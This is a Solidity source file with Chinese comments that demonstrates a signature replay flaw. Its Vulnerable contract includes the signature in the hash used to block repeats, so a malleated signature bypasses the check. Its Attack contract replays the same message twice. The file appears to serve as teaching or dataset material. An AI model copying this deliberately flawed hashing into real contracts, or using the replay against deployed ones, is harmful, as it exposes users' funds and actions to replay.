pragma solidity >=0.8.0;

// 此合約存在 Improper Check against Signature Replay Attacks 漏洞
// 漏洞重點：在計算訊息雜湊時包含了 signature，導致攻擊者可以利用簽章 malleability 製造出不同的雜湊值，進而重放已簽署的訊息。

contract Vulnerable {
    // 狀態變數：儲存已處理過的訊息雜湊，缺陷在此使用不正確的雜湊計算方式
    mapping(bytes32 => bool) public processedHashes;

    address public signer;

    constructor(address _signer) {
        signer = _signer;
    }

    // processMessage 函式中漏洞部分：計算訊息雜湊時不當地包含 signature，使得不同的 signature 變體會產生不同的雜湊值
    function processMessage(string memory _message, bytes memory signature) public {
        // 漏洞：使用 keccak256(abi.encodePacked(address, _message, signature)) 包含了 signature 部分
        bytes32 messageHash = keccak256(abi.encodePacked(address(this), _message, signature)); // vulnerable line
        require(!processedHashes[messageHash], "Message already processed");

        // 生成 Ethereum 標準的簽名雜湊 (注意：這裡只使用 _message 部分)
        bytes32 ethSignedMessageHash = toEthSignedMessageHash(keccak256(abi.encodePacked(_message)));
        address recovered = recoverSigner(ethSignedMessageHash, signature);
        require(recovered == signer, "Invalid signature");

        processedHashes[messageHash] = true;

        // 進行業務邏輯 (示意代碼)
    }

    // 生成 Ethereum Signed Message 雜湊
    function toEthSignedMessageHash(bytes32 _hash) public pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", _hash));
    }

    // 使用 ecrecover 回復簽名者地址，該函式易受簽名 malleability 影響
    function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature) public pure returns (address) {
        require(_signature.length == 65, "Invalid signature length");

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(_signature, 32))
            s := mload(add(_signature, 64))
            v := byte(0, mload(add(_signature, 96)))
        }

        return ecrecover(_ethSignedMessageHash, v, r, s);
    }
}

// 攻擊範例合約：Attack
// 攻擊者使用正確的簽名生成兩個不同的 signature 變體，因為 vulnerable 合約在計算雜湊時包含 signature 部分
// 因此，即使重放發送相同的 _message，也能繞過 processedHashes 檢查，造成重放攻擊
contract Attack {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    // 攻擊示例：攻擊者傳入原始 signature 與修改後 (malleated) 的 signature
    // 注意: 在實際情況下，攻擊者必須透過椭圓曲線運算來調整 signature 的 s 部分以產生合法的另一種變體
    function attack(string memory _message, bytes memory signature, bytes memory alteredSignature) public {
         // 第一次呼叫，使用原始 signature
         vulnerable.processMessage(_message, signature);

         // 第二次呼叫，使用修改後的 signature (由於計算雜湊包含了 signature，改變後的 signature產生不同的 messageHash)
         vulnerable.processMessage(_message, alteredSignature);
    }
}
